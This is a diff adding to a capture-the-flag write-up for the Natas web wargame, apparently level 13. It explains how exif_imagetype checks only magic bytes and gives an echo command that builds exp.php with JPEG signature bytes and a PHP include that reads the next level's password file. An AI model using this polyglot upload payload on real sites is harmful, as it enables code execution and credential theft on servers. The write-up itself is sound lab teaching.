@@ -23,4 +23,13 @@ Let's spot the difference between the previous and the current source code, what
 }
 ```
 
-In this challenge we are using [exif_imagetype](http://php.net/manual/en/function.exif-imagetype.php) to check if it is an image or not.But this function does is check the magic number of the file (File Signature), to do that it reads the first bytes of the file 
+In this challenge we are using [exif_imagetype](http://php.net/manual/en/function.exif-imagetype.php) to check if it is an image or not.But this function does is check the magic number of the file (File Signature), to do that it reads the first bytes of the file to tell if its an image or not.
+
+we can bypass this function by crafting a php file beginning with an image file signature (.jpg for example) then we concatenate a malicious command : **include '/etc/natas_webpass/natas14'** for example.  
+
+## how can we craft the file ? 
+
+```bash
+echo "\xff\xd8\xff\xe8 <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
+```
+
